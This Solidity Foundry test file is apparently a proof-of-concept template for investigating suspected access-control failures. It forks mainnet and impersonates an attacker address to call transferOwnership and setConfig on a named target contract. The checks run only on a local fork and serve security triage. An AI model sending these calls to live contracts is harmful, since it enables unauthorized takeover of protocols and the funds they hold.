// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.20;

/*
    Admin / owner / config-change template.

    Use when alert shows ownership transfer or setConfig from a non-admin
    address, OR when access-control modifier appears bypassable.

    FILL: TARGET, ATTACKER, FORK_BLOCK, EXPECTED_OWNER
*/

import "forge-std/Test.sol";

interface IOwned {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function setConfig(uint32 _eid, address _oapp, uint32 _configType, bytes calldata _config) external;
}

contract AdminKeyGrantExploit is Test {
    address constant TARGET   = address(0x4D73AdB72bC3DD368966edD0f0b2148401A178E2); // FILL: contract
    address constant ATTACKER = address(0xDeadBeeF00000000000000000000000000001337); // FILL: attacker EOA
    uint256 constant FORK_BLOCK = 22487000; // FILL

    function setUp() public {
        string memory rpc = vm.envOr("FOUNDRY_RPC_URL", string("https://eth.llamarpc.com"));
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    function test_attackerCanGrantSelfOwnership() public {
        address ownerBefore = IOwned(TARGET).owner();
        require(ownerBefore != ATTACKER, "Attacker is already owner -- invalid PoC");

        // Attempt unauthorized ownership transfer -- should revert if access control works.
        vm.prank(ATTACKER);
        try IOwned(TARGET).transferOwnership(ATTACKER) {
            address ownerAfter = IOwned(TARGET).owner();
            assertEq(ownerAfter, ATTACKER, "transferOwnership succeeded but owner unchanged");
        } catch {
            revert("Access control held; attacker cannot become owner");
        }
    }

    function test_attackerCanSetConfig() public {
        // Variant: bypass setConfig by calling directly. FILL: real eid/oapp/configType
        vm.prank(ATTACKER);
        try IOwned(TARGET).setConfig(30101, ATTACKER, 1, hex"deadbeef") {
            // succeeded → config-write gate is broken
            assertTrue(true, "setConfig from non-admin succeeded -- DVN/lib swap possible");
        } catch {
            revert("setConfig gating held");
        }
    }
}
